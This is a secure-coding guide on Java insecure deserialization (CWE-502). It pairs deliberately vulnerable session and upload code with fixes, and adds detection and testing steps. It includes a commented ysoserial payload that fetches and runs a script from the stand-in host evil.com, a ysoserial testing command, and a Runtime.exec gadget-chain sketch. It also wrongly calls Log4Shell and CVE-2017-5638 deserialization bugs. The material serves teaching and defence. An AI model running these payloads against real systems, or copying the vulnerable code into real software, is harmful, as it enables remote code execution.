# Insecure Deserialization (CWE-502)

## Metadata
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **Category**: Input Validation & Representation
- **Severity**: CRITICAL
- **Language**: Java, C#, Python, PHP
- **OWASP Top 10**: A08:2021 - Software and Data Integrity Failures

---

## Overview

**Insecure Deserialization** occurs when untrusted data is deserialized without proper validation. Deserializing untrusted data can allow attackers to execute arbitrary code, perform denial-of-service attacks, or bypass authentication. Java's `ObjectInputStream`, Python's `pickle`, and PHP's `unserialize()` are extremely dangerous when deserializing untrusted input.

**Attack Scenario:**
1. Attacker crafts malicious serialized object
2. Application deserializes the untrusted data
3. Malicious code executes during deserialization
4. System compromised

**Potential consequences:**
- **Execute arbitrary code** (Remote Code Execution)
- **Perform Denial of Service attacks**
- **Bypass authentication mechanisms**
- **Manipulate application logic**

**Famous Exploits:**
- Apache Commons Collections gadget chains
- Java RMI exploits
- Log4Shell (CVE-2021-44228) involved deserialization
- Equifax breach (2017) - Insecure deserialization in Apache Struts

---

## Security Measures

**Prevention Strategies:**

1. **Avoid Deserialization (Best)**
   - Use safe formats: JSON, XML, Protocol Buffers
   - Use data-only formats without code execution

2. **Whitelist Validation**
   - Explicitly restrict deserializable classes
   - Use `ObjectInputFilter` (Java 9+)
   - Implement custom serialization filters

3. **Integrity Checks**
   - Sign serialized data with HMAC
   - Verify signature before deserialization
   - Encrypt sensitive serialized data

4. **Isolation & Sandboxing**
   - Deserialize in low-privilege environment
   - Use SecurityManager (Java)
   - Monitor for suspicious deserialization

---

## Code Examples

### ❌ Vulnerable Java Code - Unvalidated Deserialization

```java
import java.io.*;
import java.util.Base64;

public class VulnerableDeserialization {

    // Directly deserializing user input - extremely dangerous!
    public Object deserializeUserInput(String base64Data) throws Exception {
        byte[] data = Base64.getDecoder().decode(base64Data);
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);

        // Any class can be deserialized - RCE vulnerability!
        Object obj = ois.readObject();

        ois.close();
        return obj;
    }

    // Deserializing session data from cookie
    public UserSession restoreSession(HttpServletRequest request) throws Exception {
        Cookie[] cookies = request.getCookies();
        for (Cookie cookie : cookies) {
            if ("SESSION".equals(cookie.getName())) {
                // Deserializing cookie value - attacker can manipulate!
                return (UserSession) deserializeUserInput(cookie.getValue());
            }
        }
        return null;
    }
}

class UserSession implements Serializable {
    private String username;
    private boolean isAdmin;

    // getters and setters...
}
```

**Why Vulnerable:**
1. ❌ No validation of deserialized classes
2. ❌ Trusts user-provided data (cookie)
3. ❌ No integrity check (HMAC)
4. ❌ Can deserialize malicious gadget chains
5. ❌ Direct exploitation path to RCE

**Attack Example:**
```java
// Attacker creates malicious payload using ysoserial
// ysoserial CommonsCollections6 "curl evil.com/backdoor.sh | sh" > payload.ser
// Encode to Base64 and set as SESSION cookie
// Application executes arbitrary code during deserialization
```

---

### ❌ Vulnerable Java Code - File Upload Deserialization

```java
public class FileProcessor {

    public void processUploadedFile(InputStream fileStream) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(fileStream);

        // Directly deserializing uploaded file
        Object data = ois.readObject();

        if (data instanceof UserData) {
            UserData userData = (UserData) data;
            processData(userData);
        }

        ois.close();
    }
}
```

**Why Vulnerable:**
1. ❌ Deserializes untrusted file uploads
2. ❌ Type check happens AFTER deserialization (too late!)
3. ❌ No class whitelist
4. ❌ Attacker can upload malicious .ser file

---

### ✅ Secure Java Code - Avoid Deserialization (Use JSON)

```java
import com.fasterxml.jackson.databind.ObjectMapper;

public class SecureSessionManager {

    private static final ObjectMapper mapper = new ObjectMapper();

    // Use JSON - safe parsing instead of deserialization
    public UserSession restoreSession(HttpServletRequest request) {
        Cookie[] cookies = request.getCookies();
        for (Cookie cookie : cookies) {
            if ("SESSION".equals(cookie.getName())) {
                try {
                    // JSON parsing - no code execution
                    String json = new String(
                        Base64.getDecoder().decode(cookie.getValue())
                    );

                    // HMAC signature verification
                    if (!verifyHMAC(json, getSignatureFromCookie(cookie))) {
                        throw new SecurityException("Invalid session signature");
                    }

                    return mapper.readValue(json, UserSession.class);

                } catch (Exception e) {
                    log.error("Failed to parse session", e);
                    return null;
                }
            }
        }
        return null;
    }

    private boolean verifyHMAC(String data, String signature) {
        try {
            SecretKey key = getSecretKey();
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(key);

            byte[] expectedSignature = mac.doFinal(data.getBytes());
            byte[] actualSignature = Base64.getDecoder().decode(signature);

            return MessageDigest.isEqual(expectedSignature, actualSignature);
        } catch (Exception e) {
            return false;
        }
    }
}
```

**Security Benefits:**
1. ✅ Uses JSON instead of Java serialization
2. ✅ No arbitrary code execution possible
3. ✅ HMAC signature verification
4. ✅ Data-only format
5. ✅ Jackson safely deserializes to specific class

---

### ✅ Secure Java Code - ObjectInputFilter (Java 9+)

```java
import java.io.*;
import java.util.Set;

public class SecureDeserializationWithFilter {

    // Allowed class whitelist
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.UserData",
        "com.example.SessionInfo",
        "java.lang.String",
        "java.util.ArrayList"
    );

    public Object safeDeserialize(InputStream input) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(input);

        // Restrict classes using Java 9+ ObjectInputFilter
        ois.setObjectInputFilter(new ObjectInputFilter() {
            @Override
            public Status checkInput(FilterInfo info) {
                // Class whitelist validation
                if (info.serialClass() != null) {
                    String className = info.serialClass().getName();

                    if (!ALLOWED_CLASSES.contains(className)) {
                        // Reject non-whitelisted classes
                        System.err.println("Blocked deserialization of: " + className);
                        return Status.REJECTED;
                    }
                }

                // Array size limit (DoS prevention)
                if (info.arrayLength() > 10000) {
                    return Status.REJECTED;
                }

                // Object depth limit
                if (info.depth() > 10) {
                    return Status.REJECTED;
                }

                // Total size limit
                if (info.streamBytes() > 1_000_000) {
                    return Status.REJECTED;
                }

                return Status.UNDECIDED;
            }
        });

        Object obj = ois.readObject();
        ois.close();

        return obj;
    }
}
```

**Security Benefits:**
1. ✅ Whitelist of allowed classes
2. ✅ Rejects dangerous gadget chains
3. ✅ Array size limits (DoS prevention)
4. ✅ Depth limits
5. ✅ Stream size limits
6. ✅ Java 9+ built-in protection

---

### ✅ Secure Java Code - Digital Signature Verification

```java
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Base64;

public class SignedSerialization {

    private static final String HMAC_ALGORITHM = "HmacSHA256";
    private SecretKey signingKey;

    public SignedSerialization(byte[] key) {
        this.signingKey = new SecretKeySpec(key, HMAC_ALGORITHM);
    }

    // Serialize + HMAC signature
    public String serializeAndSign(Serializable obj) throws Exception {
        // 1. Serialize the object
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();

        byte[] serialized = bos.toByteArray();

        // 2. Generate HMAC signature
        Mac mac = Mac.getInstance(HMAC_ALGORITHM);
        mac.init(signingKey);
        byte[] signature = mac.doFinal(serialized);

        // 3. Combine data + signature
        String data = Base64.getEncoder().encodeToString(serialized);
        String sig = Base64.getEncoder().encodeToString(signature);

        return data + "." + sig;
    }

    // HMAC verification + deserialization
    public Object verifyAndDeserialize(String signedData) throws Exception {
        String[] parts = signedData.split("\\.");
        if (parts.length != 2) {
            throw new SecurityException("Invalid signed data format");
        }

        byte[] data = Base64.getDecoder().decode(parts[0]);
        byte[] providedSignature = Base64.getDecoder().decode(parts[1]);

        // 1. Verify signature
        Mac mac = Mac.getInstance(HMAC_ALGORITHM);
        mac.init(signingKey);
        byte[] expectedSignature = mac.doFinal(data);

        if (!MessageDigest.isEqual(expectedSignature, providedSignature)) {
            throw new SecurityException("Invalid signature - data may be tampered");
        }

        // 2. Only deserialize if signature is valid
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        Object obj = ois.readObject();
        ois.close();

        return obj;
    }
}

// Usage example
class Example {
    public static void main(String[] args) throws Exception {
        byte[] secretKey = "YOUR-SECRET-KEY-32-BYTES-LONG!!".getBytes();
        SignedSerialization ss = new SignedSerialization(secretKey);

        UserSession session = new UserSession("john", false);

        // Serialize + sign
        String signed = ss.serializeAndSign(session);

        // Store in cookie
        Cookie cookie = new Cookie("SESSION", signed);
        cookie.setHttpOnly(true);
        cookie.setSecure(true);

        // Verify signature when restoring later
        UserSession restored = (UserSession) ss.verifyAndDeserialize(signed);
    }
}
```

**Security Benefits:**
1. ✅ HMAC signature prevents tampering
2. ✅ Only deserializes if signature valid
3. ✅ Attacker cannot modify serialized data
4. ✅ Integrity protection
5. ✅ Still need ObjectInputFilter for defense-in-depth

---

## References

### CWE
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

### OWASP
- [OWASP Top 10 2021 - A08: Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

### Java Specific
- [Java Serialization Security](https://www.oracle.com/java/technologies/javase/seccodeguide.html#8)
- [ObjectInputFilter Documentation](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/ObjectInputFilter.html)

### Tools
- **ysoserial**: Java deserialization exploit tool
  - https://github.com/frohoff/ysoserial
- **SerialKiller**: Java deserialization firewall
  - https://github.com/ikkisoft/SerialKiller

### CVEs
- CVE-2015-7501: JBoss deserialization RCE
- CVE-2017-5638: Apache Struts deserialization (Equifax breach)
- CVE-2021-44228: Log4Shell (involved deserialization)

---

## Detection Methods

### Static Analysis Patterns

**Grep Patterns:**
```bash
# Find ObjectInputStream usage
grep -rn "ObjectInputStream" --include="*.java" .

# Find readObject calls
grep -rn "\\.readObject()" --include="*.java" .

# Find serialVersionUID declarations (serializable classes)
grep -rn "serialVersionUID" --include="*.java" .

# Find classes implementing Serializable
grep -rn "implements.*Serializable" --include="*.java" .
```

### Code Review Checklist
- [ ] No untrusted data deserialization
- [ ] ObjectInputFilter used (Java 9+)
- [ ] Class whitelist enforced
- [ ] HMAC signature verification before deserialization
- [ ] Consider JSON/XML instead of Java serialization
- [ ] SecurityManager enabled in production
- [ ] Deserialization logging and monitoring
- [ ] Regular updates for deserialization libraries

### Dynamic Analysis
```bash
# Test with ysoserial payloads
java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned" > payload.ser

# Send payload to application
curl -X POST -H "Content-Type: application/octet-stream" \
  --data-binary @payload.ser \
  http://localhost:8080/api/upload

# Monitor for command execution
ls -la /tmp/pwned
```

---

## Security Verification Checklist

### Design Phase
- [ ] Avoid Java serialization if possible
- [ ] Use JSON, Protocol Buffers, or XML instead
- [ ] Design API to accept data-only formats
- [ ] Plan signature verification strategy

### Implementation Phase
- [ ] Use ObjectInputFilter (Java 9+)
- [ ] Implement class whitelist
- [ ] Add HMAC signature to serialized data
- [ ] Verify signature before deserialization
- [ ] Set array/depth/size limits
- [ ] Never deserialize user-provided data directly
- [ ] Use try-with-resources for streams
- [ ] Log deserialization attempts

### Testing Phase
- [ ] Test with ysoserial gadget chains
- [ ] Verify ObjectInputFilter blocks malicious classes
- [ ] Test signature verification bypass attempts
- [ ] Fuzz test with malformed serialized data
- [ ] Test DoS with large/deep objects
- [ ] Penetration test with real exploits

### Deployment Phase
- [ ] Enable SecurityManager
- [ ] Monitor deserialization in logs
- [ ] Set up alerts for blocked deserialization
- [ ] Keep deserialization libraries updated
- [ ] Use WAF rules to detect serialized payloads

---

## Additional Security Measures

### Alternative: Protocol Buffers

```java
import com.google.protobuf.InvalidProtocolBufferException;

// Protocol Buffers - safe serialization
public class ProtobufSerialization {

    public byte[] serialize(UserProto.User user) {
        return user.toByteArray();
    }

    public UserProto.User deserialize(byte[] data)
            throws InvalidProtocolBufferException {
        // Protocol Buffers cannot execute code - safe!
        return UserProto.User.parseFrom(data);
    }
}
```

### JVM-Wide Protection

```java
// Set global serialization filter at JVM startup
// Java 9+
public class GlobalSerializationFilter {
    public static void main(String[] args) {
        // Set global filter
        ObjectInputFilter.Config.setSerialFilter(
            ObjectInputFilter.Config.createFilter(
                "com.example.safe.*;java.base/*;!*"
            )
        );

        // Start application
        SpringApplication.run(MyApp.class, args);
    }
}
```

**JVM Options:**
```bash
# Set global serialization filter
java -Djdk.serialFilter=com.example.safe.*;java.base/*;!* \
     -jar application.jar
```

---

## Related Vulnerabilities

- **CWE-502**: Deserialization of Untrusted Data
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **CWE-470**: Use of Externally-Controlled Input to Select Classes or Code
- **CWE-94**: Improper Control of Generation of Code (Code Injection)

---

## Severity and Impact

### CVSS v3.1 Base Score: 9.8 (CRITICAL)
- **Attack Vector**: Network
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: None
- **Impact**: Complete system compromise (RCE)

### Business Impact
- **Confidentiality**: Complete data breach
- **Integrity**: System compromise, data manipulation
- **Availability**: Denial of service, ransomware
- **Compliance**: GDPR, PCI-DSS violations

---

## Real-World Examples

### Apache Commons Collections Exploit
```java
// Gadget chain example (simplified)
// Real exploits use complex reflection chains

Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"})  // Execute calculator
};

ChainedTransformer chain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);

// When deserialized, executes command
```

---

## Summary

Insecure deserialization is a critical vulnerability that allows attackers to execute arbitrary code by sending malicious serialized objects. Always prefer safe formats like JSON or Protocol Buffers. If Java serialization is necessary, use ObjectInputFilter, implement HMAC signature verification, and restrict deserializable classes to a whitelist.

**Key Takeaways:**
1. **Avoid Java serialization** - Use JSON, Protobuf, XML instead
2. **Use ObjectInputFilter** (Java 9+) to whitelist classes
3. **Sign serialized data** with HMAC before storage/transmission
4. **Verify signatures** before deserialization
5. **Never trust user input** - All serialized data is untrusted
6. **Monitor and log** deserialization attempts
7. **Keep libraries updated** - Many gadget chains in old versions

**Never deserialize untrusted data without proper validation!**
